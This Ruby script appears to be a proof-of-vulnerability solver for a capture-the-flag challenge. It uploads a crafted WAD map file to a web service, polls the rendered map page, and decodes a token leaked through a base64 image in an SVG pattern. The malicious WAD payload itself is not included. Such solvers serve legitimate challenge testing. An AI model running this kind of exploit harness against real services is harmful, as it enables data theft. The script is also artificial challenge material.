#!/bin/env ruby

require "logger"

require 'securerandom'

require "mechanize"

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end)

# seconds to wait for a given activity
DEFAULT_TIME_LIMIT = 5

# times to try some requests
PROCESS_ATTEMPTS = 5

# time between attempts
WAIT_BETWEEN_ATTEMPTS = PROCESS_ATTEMPTS / (2.0 + DEFAULT_TIME_LIMIT)

UUID_REGEXP = /([0-9a-f]{8}\-[0-9a-f]{4}\-[0-9a-f]{4}\-[0-9a-f]{4}\-[0-9a-f]{12})/

class Pov
  attr_reader :host, :port


  def initialize
    @host = ENV['HOST'] || 'challenge'
    @port = ENV['PORT'] || '3035'

    @base_uri = URI "http://#{@host}:#{@port}/"
  end

  def run!
    Mechanize.start do |agent|
      agent.follow_redirect = false
      agent.agent.allowed_error_codes = [404, 425]

      index = agent.get @base_uri
      form = index.form_with id: 'upload_map_form'

      form.file_upload('map').file_name = File.join(__dir__, 'e1m1.wad')
      post_submit = form.submit

      assert_equal '303', post_submit.code

      map_page_uri = @base_uri.dup
      map_page_uri.path = post_submit.response['location']
      id = map_page_uri.path.match(UUID_REGEXP)[1]

      map_page = nil

      PROCESS_ATTEMPTS.times do 
        maybe_map = agent.get map_page_uri
        if '200' == maybe_map.code 
          map_page = maybe_map
          break
        end
        sleep WAIT_BETWEEN_ATTEMPTS 
      end

      assert map_page, "Couldn't load map page"
      image_in_pattern = map_page.css('pattern image')
      assert(image_in_pattern.first,
        "no patterns with images, it's probably the error svg")

      assert((image = image_in_pattern.first['href']))
      content = image.split('base64,').last
      token = Base64.decode64(content)

      puts "TOKEN=#{token}"
    end
  end

  private

  def assert_equal(expected, actual)
    assert(expected == actual, "expected #{expected} to == #{actual}")
  end

  def assert(predicate, message='failed assertion')
    return if predicate
    fail message
  end
end

pov = Pov.new
at_exit do
  LLL.info((["ruby", $0] + ARGV).join(' '))
end
pov.run!

LLL.info "success :)"
